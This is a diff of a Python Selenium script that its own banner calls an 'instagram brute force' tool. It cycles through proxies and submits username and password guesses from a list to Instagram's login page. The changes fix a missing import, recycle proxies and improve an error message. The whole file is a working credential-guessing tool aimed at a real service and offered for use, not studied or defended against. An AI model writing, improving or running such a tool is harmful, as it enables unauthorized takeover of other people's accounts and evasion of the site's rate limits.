@@ -1,6 +1,7 @@
 from selenium import webdriver
 from selenium.webdriver.firefox.firefox_profile import FirefoxProfile
 import time
+import os
 def userid():
 	print("""
 [*] founded.
@@ -14,7 +15,7 @@ time.sleep(5)
 os.system("cls")
 print("""
 instagram brute force created by $bash.
-		ig.com/yigitaydn.py
+	ig.com/yigitaydn.py
   dont try at home and mine acc xD!
 	""")
 
@@ -33,6 +34,7 @@ for i in idpw:
 		port = whitelist[1]
 		ip = str(ip)
 		proxy.remove(x)
+		proxy.append(x)
 		port = int(port)
 		profile.set_preference("network.proxy.type", 1)
 		profile.set_preference("network.proxy.http", ip)
@@ -47,7 +49,7 @@ for i in idpw:
 	try:
 		driver.get("https://www.instagram.com/accounts/login/")
 	except:
-		print("Proxy Error! %s" %(ip,port))
+		print("Proxy Error! IP: %s PORT: %s" %(ip,port))
 	time.sleep(3)
 	username = driver.find_element_by_name("username")
 	passaword= driver.find_element_by_name("password")
